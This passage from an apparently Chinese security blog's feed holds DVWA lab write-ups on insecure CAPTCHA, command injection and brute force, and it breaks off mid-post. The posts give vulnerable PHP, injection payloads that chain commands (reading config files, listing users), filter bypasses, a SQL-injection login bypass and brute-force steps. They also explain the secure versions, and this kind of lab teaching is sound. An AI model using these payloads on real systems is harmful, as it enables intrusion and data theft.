deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">    &#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'password_new'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'password_conf'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'g-recaptcha-response'</span>:<span class="string">'hidd3n_valu3'</span>,</span><br><span class="line">    <span class="string">'Change'</span>:<span class="string">'Change'</span></span><br><span class="line">    &#125;</span><br><span class="line">r=requests.post(url,headers=header,data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'Password Changed.'</span>) <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">'Password Changed.'</span>)</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_new  = stripslashes( $pass_new ); </span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new ); </span><br><span class="line">    $pass_new  = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line">    $pass_conf = stripslashes( $pass_conf ); </span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf ); </span><br><span class="line">    $pass_conf = md5( $pass_conf ); </span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &apos;password_current&apos; ]; </span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct? </span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // Update the database </span><br><span class="line">            $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success! </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Feedback for the end user - failed! </span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出服务器采用了token认证机制，还采用了PDO防止SQL注入，更主要的是对于校验验证码的过程只检测了我们不可控的参数$resp-&gt;is_valid，可谓是非常完美的防御了各种漏洞。用户还必须输入当前的密码，更加完善了安全性</p>]]></content>
    
    <summary type="html">
    
      dvwa-Insecure CAPTCHA
    
    </summary>
    
      <category term="dvwa-Insecure CAPTCHA" scheme="https://Foxgrin.github.io/categories/dvwa-Insecure-CAPTCHA/"/>
    
    
      <category term="Insecure CAPTCHA" scheme="https://Foxgrin.github.io/tags/Insecure-CAPTCHA/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Command Injection</title>
    <link href="https://Foxgrin.github.io//posts/63531/"/>
    <id>https://Foxgrin.github.io//posts/63531/</id>
    <published>2018-07-15T06:18:00.000Z</published>
    <updated>2018-07-15T09:55:42.115Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中命令注入漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>了解这里的漏洞之前，我们还是先来了解一下一些函数的使用：</p><p>(1)stristr(string,search,before_search)：搜索一个字符串在另一个字符串中首次出现的位置的剩余部分，搜索失败返回false,其中参数string表示被搜索的字符串，search表示要搜索的字符串，before_search是可选参数，默认为false，如果设置为true则返回搜索字符串在被搜索字符串首次出现的位置的前面部分</p><p>例子如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo stristr(&apos;I love php&apos;,&apos;love&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p>搜索love在原字符串中首次出现位置的剩余部分，结果返回love php，验证结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)php_uname(mode)：返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 </p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> stristr(php_uname(<span class="string">'s'</span>),<span class="string">'Windows NT'</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见源代码中对操作系统的名称进行了检测</p><p>(3)shell_exec(cmd)：在外部执行一个命令，参数cmd即为要执行的命令</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=shell_exec(<span class="string">'ping 127.0.0.1'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$cmd&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以通过该漏洞执行我们想要执行的命令，但要保证前面ping命令格式的正确，再通过命令连接符跟上我们想要执行的命令在windows下 &amp;&amp;,&amp;,|,|| 都可以当做命令连接符，四者区别如下：</p><p>命令1 &amp;&amp; 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2</p><p>命令1 &amp; 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2</p><p>命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功</p><p>命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2</p><p>然后我们就可以执行想要执行的命令了</p><p>例如要获取用户信息</p><p>输入127.0.0.1 &amp;&amp; net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取ip地址信息</p><p>输入127.0.0.1 &amp;&amp; ipconfig</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取arp表信息</p><p>输入127.0.0.1 &amp;&amp; arp -a</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以利用type命令查看一些配置文件内容，前提是已经文件绝对路径</p><p>例如查看mysql配置信息</p><p>输入127.0.0.1 | type C:\phpStudy\PHPTutorial\MySQL\my.ini</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见，该漏洞的危害是很大的，攻击者可以执行任意想执行的命令</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">$substitutions=array(</span><br><span class="line">&apos;&amp;&amp;&apos;=&gt;&apos;&apos;,</span><br><span class="line">&apos;;&apos;=&gt;&apos;&apos;</span><br><span class="line">);</span><br><span class="line">$target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们还是先来了解几个函数：</p><p>(1)array_keys(array,value,strict)：返回包含数组中所有键名的新数组，参数array为所选数组，value为指定键值，若输入则返回键值对应的键名，strict指定依赖类型</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$substitutions=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'&amp;&amp;'</span>=&gt;<span class="string">''</span>,</span><br><span class="line"><span class="string">';'</span>=&gt;<span class="string">''</span></span><br><span class="line">);</span><br><span class="line">print_r(array_keys($substitutions));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)str_replace(find,replace,string,count)：以其他字符替换所选字符串中的指定字符，参数find为查找的字符，replace为替换的字符，string为所选的字符串，count为计算替换数的变量</p><p>了解了这两个函数，我们就可以这关对’&amp;&amp;’和’;’这两个字符进行了过滤，但是str_replace函数是非常不安全的，因为它只进行了一次的替换，最普遍的绕过方法就是双写绕过，但是这里&amp;&amp;由于都是同样的字符无法双写，但是服务器还对’;’字符进行了过滤，所以我们可以输入</p><p>127.0.0.1 &amp;;&amp; net user，由于只过滤了一次，过滤字符’;’后就剩下了&amp;&amp;，结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>虽然&amp;&amp;被过滤了，但是命令连接符还有&amp;和|可以使用，注意三者的区别即可</p><p>输入127.0.0.1 | net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=trim($_REQUEST[&apos;ip&apos;]);</span><br><span class="line">$substitutions = array( </span><br><span class="line">        &apos;&amp;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;| &apos; =&gt; &apos;&apos;, </span><br><span class="line">        &apos;-&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;$&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;(&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;)&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;`&apos;  =&gt; &apos;&apos;, </span><br><span class="line">        &apos;||&apos; =&gt; &apos;&apos;, </span><br><span class="line">    ); </span><br><span class="line">    $target=str_replace(array_keys($substitutions),$substitutions,$target);</span><br><span class="line">    if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关过滤的字符较为完全，其中过滤了字符’&amp;’，也就是说连接符&amp;&amp;和&amp;都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用</p><p>输入127.0.0.1|net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以在||中间加一个被过滤的字符，例如；</p><p>但是必须保证ping 命令执行失败才执行||之后的命令</p><p>输入11 |;| net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功绕过过滤</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    $octet = explode( &quot;.&quot;, $target ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer </span><br><span class="line"></span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int&apos;s put the IP back together. </span><br><span class="line"></span><br><span class="line">        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; </span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">            // Windows </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        else &#123; </span><br><span class="line"></span><br><span class="line">            // *nix </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // Ops. Let the user name theres a mistake </span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line"></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先还是先了解几个函数：</p><p>(1)explode(separator,string,limit)：将字符串打散成数组，返回组成的数组，参数separator为分隔符，规定在哪里开始分割字符串，string为要分割的字符串，limit规定所返回的数组元素的数目</p><p>(2)is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false</p><p>(3)sizeof(array,mode)：计算数组中的元素个数</p><p>这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求</p><p>然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址</p><p>也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞</p>]]></content>
    
    <summary type="html">
    
      dvwa-Command Injection
    
    </summary>
    
      <category term="dvwa-Command Injection" scheme="https://Foxgrin.github.io/categories/dvwa-Command-Injection/"/>
    
    
      <category term="Command Injection" scheme="https://Foxgrin.github.io/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Brute Force</title>
    <link href="https://Foxgrin.github.io//posts/22283/"/>
    <id>https://Foxgrin.github.io//posts/22283/</id>
    <published>2018-07-14T07:50:00.000Z</published>
    <updated>2018-07-14T13:50:44.048Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中暴力破解的一些关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关卡是一个用户登录的界面，用户必须正确输入用户名和密码才能成功登录，我们从源代码来看，服务器只对是否GET了一个Login值进行了检测，存在了明显的sql注入漏洞，攻击者不仅可以通过sql注入获取用户信息，还可以利用暴力破解的方法获取用户密码，这就是Brute Force(暴力破解)</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>(1)利用burpsuite爆破密码</p><p>首先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为我们要对password参数进行爆破，所以在password参数的内容两边加上$</p><p>然后将包发送到intruder模块，选中Payloads，载入字典，点击爆破</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从爆破结果的响应包长度来看，只有值为password的响应包长度与众不同，猜测正确密码就是password，尝试登陆，成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)sql注入</p><p>首先寻找注入点，这里因为$pass经过md5加密，所以不能当做注入点，注入点就只剩下了$user</p><p>我们可以使用万能密码登录，在username中输入admin’ or ‘1’=’1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            